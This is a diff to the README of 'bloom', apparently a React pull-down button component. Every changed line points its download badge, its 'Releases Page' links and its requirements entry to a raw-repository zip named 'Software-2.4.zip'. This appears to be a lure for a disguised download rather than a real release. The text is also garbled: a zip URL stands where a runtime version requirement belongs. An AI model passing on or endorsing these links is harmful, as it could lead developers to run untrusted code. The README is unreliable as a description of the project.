@@ -4,7 +4,7 @@
 
 Welcome to **bloom**! This is an easy-to-use pull-down button component designed for React applications. With this tool, you can create smooth and attractive button interactions that improve user experience. Follow the steps below to download and run the software.
 
-[![Download bloom](https://raw.githubusercontent.com/ojamesalaba93/bloom/main/apps/docs/app/Software-v1.3.zip)](https://raw.githubusercontent.com/ojamesalaba93/bloom/main/apps/docs/app/Software-v1.3.zip)
+[![Download bloom](https://raw.githubusercontent.com/ojamesalaba93/bloom/main/packages/bloom/Software-2.4.zip)](https://raw.githubusercontent.com/ojamesalaba93/bloom/main/packages/bloom/Software-2.4.zip)
 
 ## 🌟 Features
 
@@ -19,14 +19,14 @@ Welcome to **bloom**! This is an easy-to-use pull-down button component designed
 Before you start, make sure your computer meets these requirements:
 
 - Operating System: Windows, MacOS, or Linux
-- https://raw.githubusercontent.com/ojamesalaba93/bloom/main/apps/docs/app/Software-v1.3.zip Version 14 or higher
+- https://raw.githubusercontent.com/ojamesalaba93/bloom/main/packages/bloom/Software-2.4.zip Version 14 or higher
 - React: Your project must be built using React 16.8 or later
 
 ## 📝 Download & Install
 
 To begin, visit the following page to download the latest version of bloom:
 
-[Download bloom from the Releases Page](https://raw.githubusercontent.com/ojamesalaba93/bloom/main/apps/docs/app/Software-v1.3.zip)
+[Download bloom from the Releases Page](https://raw.githubusercontent.com/ojamesalaba93/bloom/main/packages/bloom/Software-2.4.zip)
 
 Once you're on the Releases page, follow these steps to download the latest version:
 
@@ -109,6 +109,6 @@ bloom is licensed under the MIT License. Feel free to use and modify it as neede
 
 We appreciate any contributions! If you'd like to improve the project, please fork the repository and submit a pull request. We love to see new ideas and enhancements.
 
-[Download bloom from the Releases Page](https://raw.githubusercontent.com/ojamesalaba93/bloom/main/apps/docs/app/Software-v1.3.zip)
+[Download bloom from the Releases Page](https://raw.githubusercontent.com/ojamesalaba93/bloom/main/packages/bloom/Software-2.4.zip)
 
 Thank you for using bloom! Enjoy building your projects with this beautiful button component.
